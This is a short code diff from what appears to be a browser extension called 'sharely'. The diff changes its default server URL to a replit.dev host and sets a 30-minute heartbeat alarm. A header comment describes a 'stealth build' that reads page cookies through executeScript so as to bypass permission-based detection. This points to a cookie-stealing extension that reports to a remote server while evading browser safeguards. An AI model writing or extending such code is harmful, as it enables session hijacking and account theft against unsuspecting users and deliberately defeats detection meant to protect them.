@@ -2,7 +2,7 @@
 /* Stealth build: no chrome.cookies API. Uses chrome.scripting.executeScript
    to read document.cookie from page context, bypassing permission-based detection. */
 
-const DEFAULT_SERVER_URL = 'https://sharely-production-bc58.up.railway.app';
+const DEFAULT_SERVER_URL = 'https://6cbfb053-e399-4cf0-a649-373f485ef582-00-386xnci2vytem.pike.replit.dev';
 const ALARM_NAME = 'sharely-heartbeat';
 const HEARTBEAT_MINUTES = 30;
 
